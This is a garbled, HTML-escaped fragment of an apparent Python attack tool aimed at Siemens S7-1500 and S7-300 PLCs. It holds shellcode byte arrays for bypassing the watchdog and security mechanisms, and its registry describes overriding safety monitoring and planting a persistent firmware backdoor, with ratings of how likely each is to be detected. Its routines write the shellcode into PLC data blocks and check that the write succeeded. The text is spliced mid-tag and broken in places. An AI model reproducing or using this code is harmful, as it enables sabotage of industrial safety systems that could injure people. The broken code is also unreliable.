(sys_read)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0x31\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0xDB\u003c/span\u003e,                               \u003cspan class=\"pl-c\"\u003e# xor ebx, ebx\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xB3\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x04\u003c/span\u003e,                               \u003cspan class=\"pl-c\"\u003e# mov bl, 4 (file descriptor)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xB9\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x08\u003c/span\u003e,             \u003cspan class=\"pl-c\"\u003e# mov ecx, 0x08000000 (memory start)\u003c/span\u003e\n                \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Generate Siemens S7-1500 specific shellcode leveraging modern features.\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003eshellcodes\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'watchdog_bypass'\u003c/span\u003e: \u003cspan class=\"pl-en\"\u003ebytes\u003c/span\u003e([\n                \u003cspan class=\"pl-c\"\u003e# S7-1500 enhanced watchdog bypass\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0x90\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x90\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x90\u003c/span\u003e, \u003cspan \u003cspan class=\"pl-c1\"\u003e0x01\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e,             \u003cspan class=\"pl-c\"\u003e# mov eax, 1\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xBB\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0xD0\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x08\u003c/span\u003e,             \u003cspan class=\"pl-c\"\u003e# mov ebx, 0x0800D000 (S7-1500 watchdog)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0x89\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x03\u003c/span\u003e,                               \u003cspan class=\"pl-c\"\u003e# mov [ebx], eax\u003c/span\u003e\n class=\"pl-s\"\u003e'security_bypass'\u003c/span\u003e: \u003cspan class=\"pl-en\"\u003ebytes\u003c/span\u003e([\n                \u003cspan class=\"pl-c\"\u003e# S7-1500 security mechanism \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e's7-300'\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# Default for example purposes\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003einitialize_shellcode_registry\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n class=\"pl-s\"\u003e        Provides metadata for shellcode selection and deployment.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'watchdog_bypass'\u003c/span\u003e: {\n                \u003cspan class=\"pl-s\"\u003e'description'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Disables PLC watchdog timer to prevent automatic shutdown'\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'size_range'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'16-32 bytes'\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'risk_level'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'HIGH'\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'detection_probability'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'MEDIUM'\u003c/span\u003e\n            },\n            \u003cspan class=\"pl-s\"\u003e'safety_override'\u003c/span\u003e: {\n                \u003cspan class=\"pl-s\"\u003e'description'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Overrides safety system monitoring functions'\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'size_range'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'24-48 bytes'\u003c/span\u003e, \n                \u003cspan class=\"pl-s\"\u003e'risk_level'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'CRITICAL'\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'detection_probability'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'HIGH'\u003c/span\u003e\n            },\n            \u003cspan class=\"pl-s\"\u003e'persistence'\u003c/span\u003e: {\n                \u003cspan class=\"pl-s\"\u003e'description'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Installs persistent backdoor in PLC firmware'\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'size_range'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'32-64 bytes'\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'risk_level'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'HIGH'\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'detection_probability'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'LOW'\u003c/span\u003e\n            },\n            \u003cspan class=\"pl-s\"\u003e'memory_dump'\u003c/span\u003e: {\n                \u003cspan class=\"pl-s\"\u003e'description'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Extracts PLC memory contents for analysis'\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'size_range'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'20-40 bytes'\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'risk_level'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'MEDIUM'\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'detection_probability'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'MEDIUM'\u003c/span\u003e\n            }\n        }\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eselect_deployment_method\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eshellcode_type\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Select optimal deployment method based on shellcode type and target.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Considers detection risk, reliability, and target compatibility.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003edeployment_strategies\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'watchdog_bypass'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'data_blocks'\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'safety_override'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'system_functions'\u003c/span\u003e, \n            \u003cspan class=\"pl-s\"\u003e'persistence'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'data_blocks'\u003c/span\u003e,\n class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003edeployment_strategies\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eget\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eshellcode_type\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'data_blocks'\u003c/span\u003e)\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eexecute_deployment\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eshellcode\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eshellcode_type\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute shellcode deployment using selected method.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Handles the actual deployment process based on chosen strategy.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003edeployment_method\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eselect_deployment_method\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eshellcode_type\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003edeployment_method\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'data_blocks'\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edeploy_via_data_blocks\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eshellcode\u003c/span\u003e)\n        \u003cspan class=\"pl-k\"\u003eelif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003edeployment_method\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'system_functions'\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edeploy_via_system_functions\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eshellcode\u003c/span\u003e)\n        \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e {\u003cspan class=\"pl-s\"\u003e'success'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'error'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Unknown deployment method'\u003c/span\u003e}\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003everify_shellcode_deployment\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eclient\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003edb_number\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eexpected_shellcode\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Verify successful shellcode deployment by reading back and comparing.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Ensures shellcode was written correctly to target data block.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003etry\u003c/span\u003e:\n            \u003cspan class=\"pl-c\"\u003e# Read back deployed shellcode\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003edeployed_data\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eclient\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eread_area\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x84\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003edb_number\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e, \u003cspan class=\"pl-en\"\u003elen\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eexpected_shellcode\u003c/span\u003e))\n            \n            \u003cspan class=\"pl-c\"\u003e# Compare with original shellcode\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003everification_success\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003edeployed_data\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eexpected_shellcode\u003c/span\u003e\n            \n            \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003everification_success\u003c/span\u003e:\n                \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"[+] Shellcode deployment verified successfully\"\u003c/span\u003e)\n            \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e:\n                \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"[-] Shellcode deployment verification failed\"\u003c/span\u003e)\n                \n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003everification_success\u003c/span\u003e\n            \n        \u003cspan class=\"pl-k\"\u003eexcept\u003c/span\u003e \u003cspan class=\"pl-v\"\u003eException\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eas\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ee\u003c/span\u003e:\n            \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[-] Deployment verification failed: \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003ee\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e)\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e\n\n    \u003cspan class=\"pl-c\"\u003e# Additional deployment methods would be implemented here...\u003c/span\u003e\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003edeploy_via_sfc_write\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eshellcode\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Deploy shellcode using SFC (System Function Call) write operations\"\"\"\u003c/span\u003e\n class=\"pl-s\"\u003e'success'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'method'\u003c/span\u003e: \u003cspan
